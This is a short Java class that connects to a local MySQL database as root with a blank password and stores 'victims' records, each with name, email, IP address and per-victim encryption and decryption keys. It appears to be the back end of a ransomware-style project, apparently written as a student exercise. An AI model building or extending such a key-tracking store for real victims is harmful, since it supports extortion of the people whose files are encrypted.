package backend;

import java.sql.*;

public class DbConnection {

    Connection connection;

    public DbConnection() {
        try {
            connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/db_project_poo", "root", "");
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    public void getVictims () {
        try {
            Statement statement = connection.createStatement();
            ResultSet resultSet = statement.executeQuery("SELECT * FROM victims");

            while(resultSet.next()) {
                System.out.println(resultSet.getString("name"));
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }

    }

    public boolean saveVictim (Victim victim) {
        String sql = "INSERT INTO victims (name, email, encryptKey, decryptKey, ip) VALUES (?, ?, ?, ?, ?)";
        try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
            pstmt.setString(1, victim.getName());
            pstmt.setString(2, victim.getEmail());
            pstmt.setString(3, victim.getEncryptKey());
            pstmt.setString(4, victim.getDecryptKey());
            pstmt.setString(5, victim.getIp());
            pstmt.executeUpdate();
            System.out.println("Registro guardado correctamente.");
            return true;
        } catch (SQLException e) {
            System.err.format("Error al ejecutar la consulta: %s", e.getMessage());
            return false;
        }
    }
}
